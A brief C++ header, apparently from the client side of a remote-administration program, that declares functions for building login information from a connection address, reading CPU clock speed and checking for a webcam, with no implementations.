#pragma once

#include "IOCPClient.h"
#include <Vfw.h>

#pragma comment(lib,"Vfw32.lib")

LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS &conn, BOOL &isAuthKernel);
DWORD CPUClockMHz();
BOOL WebCamIsExist();
